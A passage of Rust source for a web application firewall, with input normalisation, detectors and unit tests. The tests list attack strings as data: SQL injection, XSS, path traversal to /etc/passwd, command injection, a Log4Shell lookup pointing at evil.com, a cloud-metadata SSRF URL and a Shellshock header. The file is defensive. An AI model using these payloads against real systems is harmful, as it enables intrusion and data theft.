    let unescaped = decode_js_escapes(&twice);
    let decoded = decode_entities(&unescaped);
    let s = decoded.as_bytes();

    let mut pending_space = false;
    let mut skip_after = false;
    let mut i = 0;
    while i < s.len() {
        let c = s[i];
        // SQL comments: /* … */ (and MySQL executable comments /*! … */).
        if c == b'/' && s.get(i + 1) == Some(&b'*') {
            if s.get(i + 2) == Some(&b'!') {
                i += 3;
                while i < s.len() && s[i].is_ascii_digit() {
                    i += 1;
                }
            } else {
                match find(&s[i + 2..], b"*/") {
                    Some(end) => i += 2 + end + 2,
                    None => i = s.len(),
                }
            }
            pending_space = true;
            continue;
        }
        if c == b'*' && s.get(i + 1) == Some(&b'/') {
            i += 2;
            pending_space = true;
            continue;
        }
        if matches!(c, b' ' | b'\t' | b'\n' | b'\r' | 0x0b | 0x0c) {
            pending_space = true;
            i += 1;
            continue;
        }
        if matches!(c, b';' | b'|' | b'&' | b'(' | b')' | b'=' | b',') {
            out.push(c as char);
            pending_space = false;
            skip_after = true;
            i += 1;
            continue;
        }
        if pending_space && !skip_after && !out.is_empty() {
            out.push(' ');
        }
        pending_space = false;
        skip_after = false;
        // Push the (possibly multi-byte) char lower-cased.
        let ch_len = utf8_len(c);
        let end = (i + ch_len).min(s.len());
        match std::str::from_utf8(&s[i..end]) {
            Ok(ch) if ch.len() == 1 => out.push((c as char).to_ascii_lowercase()),
            Ok(ch) => {
                for lc in ch.chars().flat_map(char::to_lowercase) {
                    out.push(lc);
                }
            }
            Err(_) => out.push(char::REPLACEMENT_CHARACTER),
        }
        i = end;
    }
}

#[inline]
fn utf8_len(first: u8) -> usize {
    match first {
        0x00..=0x7f => 1,
        0xc0..=0xdf => 2,
        0xe0..=0xef => 3,
        0xf0..=0xf7 => 4,
        _ => 1,
    }
}

fn find(hay: &[u8], needle: &[u8]) -> Option<usize> {
    hay.windows(needle.len()).position(|w| w == needle)
}

/// Decodes JSON / JavaScript escapes (`\u003c`, `\x3c`, `\/`) so raw JSON
/// bodies cannot hide payloads from [`Waf::inspect_body`].
fn decode_js_escapes(s: &str) -> Cow<'_, str> {
    if !s.contains('\\') {
        return Cow::Borrowed(s);
    }
    let mut out = String::with_capacity(s.len());
    let mut chars = s.char_indices().peekable();
    while let Some((i, c)) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        let rest = &s[i + 1..];
        let (decoded, used) = if let Some(hex) = rest.strip_prefix('u').and_then(|r| r.get(..4)) {
            (
                u32::from_str_radix(hex, 16).ok().and_then(char::from_u32),
                5,
            )
        } else if let Some(hex) = rest.strip_prefix('x').and_then(|r| r.get(..2)) {
            (
                u32::from_str_radix(hex, 16).ok().and_then(char::from_u32),
                3,
            )
        } else if rest.starts_with('/') {
            (Some('/'), 1)
        } else {
            (None, 0)
        };
        match decoded {
            Some(d) => {
                out.push(d);
                for _ in 0..used {
                    chars.next();
                }
            }
            None => out.push('\\'),
        }
    }
    Cow::Owned(out)
}

/// Decodes the HTML entities commonly used to smuggle XSS payloads.
fn decode_entities(s: &str) -> Cow<'_, str> {
    if !s.contains('&') {
        return Cow::Borrowed(s);
    }
    let mut out = String::with_capacity(s.len());
    let mut rest = s;
    while let Some(pos) = rest.find('&') {
        out.push_str(&rest[..pos]);
        let tail = &rest[pos..];
        let end = tail[1..]
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '#'))
            .map(|e| e + 1);
        let (entity, consumed) = match end {
            Some(e) => (&tail[1..e], e + usize::from(tail[e..].starts_with(';'))),
            None => (&tail[1..], tail.len()),
        };
        let decoded = match entity.to_ascii_lowercase().as_str() {
            "lt" => Some('<'),
            "gt" => Some('>'),
            "quot" => Some('"'),
            "apos" => Some('\''),
            "amp" => Some('&'),
            "colon" => Some(':'),
            "lpar" => Some('('),
            "rpar" => Some(')'),
            "sol" => Some('/'),
            "tab" | "newline" => Some(' '),
            e if e.starts_with("#x") => u32::from_str_radix(&e[2..], 16)
                .ok()
                .and_then(char::from_u32),
            e if e.starts_with('#') => e[1..].parse::<u32>().ok().and_then(char::from_u32),
            _ => None,
        };
        match decoded {
            Some(c) => {
                out.push(c);
                rest = &tail[consumed..];
            }
            None => {
                out.push('&');
                rest = &tail[1..];
            }
        }
    }
    out.push_str(rest);
    Cow::Owned(out)
}

/// `" onerror=`, `/onload=`, `'onmouseover=` … in normalised text.
fn has_event_handler(s: &str) -> bool {
    let b = s.as_bytes();
    let mut i = 1;
    while i + 1 < b.len() {
        if b[i] == b'o' && b[i + 1] == b'n' && matches!(b[i - 1], b' ' | b'"' | b'\'' | b'/' | b'`')
        {
            let mut j = i + 2;
            while j < b.len() && b[j].is_ascii_lowercase() {
                j += 1;
            }
            let n = j - (i + 2);
            if (3..=25).contains(&n) && b.get(j) == Some(&b'=') {
                return true;
            }
        }
        i += 1;
    }
    false
}

/// CR/LF followed by something that looks like a header (`\r\nSet-Cookie:`).
fn has_header_injection(decoded: &str, any_crlf: bool) -> bool {
    if any_crlf {
        return decoded.contains(['\r', '\n']);
    }
    let b = decoded.as_bytes();
    for (i, &c) in b.iter().enumerate() {
        if c != b'\n' {
            continue;
        }
        let rest = &b[i + 1..];
        let name_len = rest
            .iter()
            .take_while(|c| c.is_ascii_alphanumeric() || **c == b'-')
            .count();
        if name_len >= 2 && rest.get(name_len) == Some(&b':') {
            return true;
        }
    }
    false
}

impl Guard for Waf {
    fn name(&self) -> &'static str {
        "waf"
    }

    fn priority(&self) -> u16 {
        priority::WAF
    }

    fn mode(&self) -> Mode {
        self.mode
    }

    fn on_request(&self, req: &mut request::Parts, _ctx: &mut Context) -> Result<(), Rejection> {
        if any_path_matches(req.uri.path(), &self.skip_paths) {
            return Ok(());
        }
        let v = self.inspect(req);
        if !v.blocked {
            return Ok(());
        }
        let cats: Vec<&str> = v.categories.iter().map(|c| c.as_str()).collect();
        Err(Rejection::new(
            StatusCode::FORBIDDEN,
            "waf_blocked",
            "Request blocked by the web application firewall.",
        )
        .with_details(format!(
            "score={} rules={:?} categories={}",
            v.score,
            v.rules,
            cats.join(",")
        )))
    }
}

impl_layer!(Waf);

#[cfg(test)]
mod tests {
    use super::*;
    use http::Request;

    fn blocked(waf: &Waf, uri: &str, headers: &[(&str, &str)]) -> Verdict {
        // Encode what clients would encode (http::Uri rejects these raw).
        let mut encoded = String::new();
        for c in uri.chars() {
            match c {
                '<' | '>' | '{' | '}' | '|' | '[' | ']' | '"' | '`' | '^' | '\\' | ' ' => {
                    encoded.push_str(&format!("%{:02X}", c as u32))
                }
                c => encoded.push(c),
            }
        }
        let mut b = Request::builder().uri(encoded);
        for (k, v) in headers {
            b = b.header(*k, *v);
        }
        waf.inspect(&b.body(()).unwrap().into_parts().0)
    }

    #[test]
    fn normalisation() {
        assert_eq!(normalize("UNION/**/SELECT", false), "union select");
        assert_eq!(normalize("UnIoN%20%20SeLeCt", false), "union select");
        assert_eq!(normalize("1+OR+1%3D1", true), "1 or 1=1");
        assert_eq!(normalize("sleep (5)", false), "sleep(5)");
        assert_eq!(normalize("/*!50000UNION*/ SELECT", false), "union select");
        assert_eq!(normalize("&lt;script&gt;", false), "<script>");
        assert_eq!(normalize("&#x3c;svg", false), "<svg");
        assert_eq!(normalize("%253Cscript", false), "<script");
        assert_eq!(normalize("ÉCOLE", false), "école");
    }

    #[test]
    fn attacks_are_blocked() {
        let waf = Waf::new();
        let attacks = [
            "/search?q=1'%20OR%20'1'='1",
            "/search?q=1%20UNION%20SELECT%20password%20FROM%20users",
            "/item?id=1;DROP%20TABLE%20users",
            "/?q=<script>alert(1)</script>",
            "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
            "/?next=javascript:alert(document.cookie)",
            "/static/..%2f..%2fetc/passwd",
            "/download?file=../../../../etc/passwd",
            "/?cmd=;cat%20/etc/passwd",
            "/?ip=127.0.0.1|whoami",
            "/?x=${jndi:ldap://evil.com/a}",
            "/?url=http://169.254.169.254/latest/meta-data/",
            "/login?user[$ne]=admin",
            "/?name={{7*7}}",
            "/?name={{config.items()}}",
            "/.env",
            "/.git/config",
            "/wp-login.php",
            "/?q=a%0d%0aSet-Cookie:%20x=1",
            "/?q=%2527%2520OR%25201%253D1",
        ];
        for a in attacks {
            assert!(blocked(&waf, a, &[]).blocked, "should block {a}");
        }
    }

    #[test]
    fn header_attacks() {
        let waf = Waf::new();
        assert!(blocked(&waf, "/", &[("user-agent", "${jndi:ldap://x/a}")]).blocked);
        assert!(blocked(&waf, "/", &[("user-agent", "() { :; }; /bin/bash -c id")]).blocked);
        assert!(blocked(&waf, "/", &[("referer", "https://x/?q=<script>")]).blocked);
        assert!(!blocked(&waf, "/", &[("authorization", "Bearer ' or 1=1")]).blocked);
    }

    #[test]
    fn legit_traffic_passes() {
        let waf = Waf::new();
        let legit = [
            "/",
            "/api/users/42",
            "/search?q=rust+web+security",
            "/search?q=what%27s+new+in+rust",
            "/blog/2024/10/union-of-sets-in-rust",
            "/products?sort=price&order=desc&page=2",
            "/docs/select-and-join",
            "/?email=jane.doe%40example.com",
            "/?q=online+banking",
            "/?redirect=%2Fdashboard",
            "/files/report..final.pdf",
            "/?q=C%2B%2B+vs+Rust",
            "/?title=Tom+%26+Jerry",
            "/?q=I+love+cats+%3B)",
            "/?expr=a%3Db",
        ];
        for l in legit {
            let v = blocked(
                &waf,
                l,
                &[(
                    "user-agent",
                    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
                )],
            );
            assert!(!v.blocked, "false positive on {l}: {v:?}");
        }
    }

    #[test]
    fn paranoia_and_tuning() {
        let low = Waf::new();
        let high = Waf::new().paranoia(Paranoia::High);
        let input = "1; select * from users where name='x' --";
        assert!(!low.inspect_text(input).blocked);
        assert!(high.inspect_text(input).blocked);
        let tuned = Waf::new().disable_category(Category::Xss);
        assert!(!tuned.inspect_text("<script>").blocked);
        let custom = Waf::new().custom_rule(5000, "EvilCorp", 5, target::ALL);
        assert!(custom.inspect_text("hello evilcorp").blocked);
        let spaced = Waf::new().custom_rule(5001, "Bad  Word ( x )", 5, target::ALL);
        assert!(spaced.inspect_text("bad word(x)").blocked);
        let no_custom = spaced.disable_category(Category::Custom);
        assert!(!no_custom.inspect_text("bad word(x)").blocked);
    }

    #[test]
    fn json_escapes_are_decoded() {
        let waf = Waf::new();
        assert!(
            waf.inspect_body(r#"{"c":"\u003cscript\u003ealert(1)"}"#)
                .blocked
        );
        assert!(waf.inspect_body(r#"{"p":"..\/..\/etc\/passwd"}"#).blocked);
        assert!(
            !waf.inspect_body(r#"{"msg":"line\nbreak \"quoted\""}"#)
                .blocked
        );
    }
}
